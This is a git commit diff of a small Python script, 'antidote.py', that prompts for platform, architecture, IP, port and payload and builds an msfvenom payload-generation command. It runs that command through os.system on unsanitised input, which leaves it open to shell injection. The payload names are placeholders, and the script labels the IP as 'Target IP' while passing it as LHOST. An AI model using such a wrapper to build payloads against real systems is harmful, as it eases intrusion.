4c9e2d4aa6dfbcebd723f5efe31fc5435ece8bbd
aaronpicard <103234130+aaronpicard@users.noreply.github.com>
2022-06-30 23:18:04 -0400

    Update antidote.py

--- antidote.py
+++ antidote.py
@@ -13,52 +13,53 @@ output = ''
 
 
 
+
 command = ['msfvenom', '--list', 'platforms']
-p = subprocess.Popen(command, stdout=subprocess.PIPE, stderr=subprocess.IGNORE)
+p = subprocess.Popen(command, stdout=subprocess.PIPE)
 text = p.stdout.read()
 retcode = p.wait()
 print(text)
 
-# platform = input('\nSelect Target Platform #: \n\n1) Linux\n2) Windows\n\n')
+platform = input('\nSelect Target Platform #: \n\n1) Linux\n2) Windows\n\n')
 
-# if platform == '1':
-#   platform = 'msfvenom -p Linux/'
-#   form = '-f elf'
-# elif platform == '2':
-#   platform = 'msfvenom -p Windows/'
-#   form = '-f exe'
-
-
-# architecture = input('\nSelect Platform architecture #: \n\n1) x86\n2) x64\n\n')
-
-# if architecture == '1':
-#   architecture = 'x86/'
-# elif architecture == '2':
-#   architecture = 'x64/'
+if platform == '1':
+  platform = 'msfvenom -p Linux/'
+  form = '-f elf'
+elif platform == '2':
+  platform = 'msfvenom -p Windows/'
+  form = '-f exe'
 
 
-# ip = input('\nEnter Target IP: \n\n')
-# LHOST = f'LHOST={ip}'
+architecture = input('\nSelect Platform architecture #: \n\n1) x86\n2) x64\n\n')
+
+if architecture == '1':
+  architecture = 'x86/'
+elif architecture == '2':
+  architecture = 'x64/'
 
 
-# port = input('\nEnter Target Port: \n\n')
-# LPORT = f'LPORT={port}'
+ip = input('\nEnter Target IP: \n\n')
+LHOST = f'LHOST={ip}'
 
 
-# payload = input('\nSelect Payload: \n\n1) payload1\n2) payload2\n\n')
-
-# if payload == '1':
-#   payload = 'payload1'
-# elif payload == '2':
-#   payload = 'payload2'
+port = input('\nEnter Target Port: \n\n')
+LPORT = f'LPORT={port}'
 
 
-# output = input('\nPlease Name Your File: ')
-# output = f'> {output}'
+payload = input('\nSelect Payload: \n\n1) payload1\n2) payload2\n\n')
+
+if payload == '1':
+  payload = 'payload1'
+elif payload == '2':
+  payload = 'payload2'
+
+
+output = input('\nPlease Name Your File: ')
+output = f'> {output}'
 
         
-# cmd = f'{platform}{architecture}{payload} {LHOST} {LPORT} {form} {output}'
+cmd = f'{platform}{architecture}{payload} {LHOST} {LPORT} {form} {output}'
 
-# # os.system(cmd)
+os.system(cmd)
 
 # print(cmd)
